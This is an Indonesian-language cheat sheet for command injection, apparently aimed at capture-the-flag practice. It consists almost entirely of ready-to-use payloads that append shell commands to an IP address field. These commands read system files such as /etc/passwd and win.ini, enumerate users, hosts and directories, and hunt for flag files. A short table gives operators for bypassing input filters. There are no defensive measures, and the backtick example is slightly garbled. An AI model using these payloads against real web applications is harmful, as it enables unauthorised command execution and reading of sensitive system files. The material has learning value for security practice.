# command injection
Command Injection adalah kerentanan yang terjadi ketika aplikasi web meneruskan input pengguna yang tidak divalidasi ke sistem operasi untuk dieksekusi
## payload dasar 
melihat user web server
```bash
192.168.68.169 & whoami 
```
Lihat konfigurasi IP
```bash
192.168.68.169 & ipconfig
```
List isi drive C
```bash
192.168.68.169 & dir C:\
```
Informasi sistem lengkap
```bash
192.168.68.169 & systeminfo
```
Baca file sistem
```bash
192.168.68.169 & type C:\Windows\win.ini
```
## Eksekusi Perintah Sistem Setelah tahu celahnya, kamu bisa menjalankan berbagai perintah.
## Perintah	Fungsi	Payload
### whoami                            Lihat user server	127.0.0.1; whoami
### id	                              Lihat ID user dan grup	127.0.0.1; id
### ls -la     	                      Lihat isi direktori	127.0.0.1; ls -la
### pwd	                              Lihat path saat ini	127.0.0.1; pwd
### cat /etc/passwd	                  Baca file password (Linux)	127.0.0.1; cat /etc/passwd
### ifconfig atau ip a	              Lihat IP server	127.0.0.1; ifconfig
### uname -a	                        Lihat info OS	127.0.0.1; uname -a
### find / -name "flag*" 2>/dev/null	Cari file flag	127.0.0.1; find / -name "flag*" 2>/dev/null

## Bypass filter sederhana
## Operator	                                    Fungsi	                                                Contoh Payload
### | (pipe)	                                  Kirim output perintah pertama ke perintah kedua        	127.0.0.1 | whoami
### || (OR)	                                    Jalankan perintah kedua jika perintah pertama GAGAL	    127.0.0.1 || whoami
### & (background)	                            Jalankan perintah kedua di background	                  127.0.0.1 & whoami
###    $()	                                         Command substitution	                                  127.0.0.1 $(whoami)
###   `cmd` (backtick)	                           Command substitution	                                  127.0.0.1 \whoami``
